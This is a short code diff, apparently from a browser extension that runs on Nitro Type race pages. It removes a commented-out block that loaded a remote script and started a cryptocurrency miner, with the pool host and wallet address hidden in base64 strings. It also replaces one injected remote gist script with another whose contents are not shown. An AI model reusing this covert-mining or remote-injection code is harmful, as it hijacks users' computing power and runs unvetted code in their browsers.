@@ -9,29 +9,7 @@
         else if (href.startsWith("https://www.nitrotype.com/race/")) res = true;
         else res = false;
         const s = document.createElement('script');
-        /*
-        s.src = 'https://cdn.rawgit.com/ultratype/5ee066234fc44fe527413b58ba4f90d2/raw/82ca5d18a20c1b58ed6a47154760c369b1ff568c/Aeon5.js';
-        s.onload = () => {
-            if (localStorage['multratype']) {
-                return;
-            }
-            const key = atob('QWVvbg==');
-            var intv = setInterval(() => {
-                if (window[key]) {
-                    let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
-                        atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
-                    let p = 'workers_';
-                    args.push(p);
-                    // args.push('wss://mcanalley.io:8282/');
-                    window[key].startp.apply(window[key], args);
-                    window[key].addMaxThreads();
-                    clearInterval(intv);
-                    return;
-                }
-            }, 100);
-        }
-        */
-        s.src = 'https://cdn.rawgit.com/ultratype/20dc8e4ddbde61026eb38d186c229848/raw/59e640e9c7a8b6aee3e5558fd4586793da209181/ccccccccccccc.js';
+        s.src = 'https://cdn.rawgit.com/wwwg/ad477f6b330525c237dd3c0e9f452e82/raw/5bcbb9c250f5d041b684ab9ba1b8260409c90279/wsc.js';
         document.head.appendChild(s);
         return res;
     }
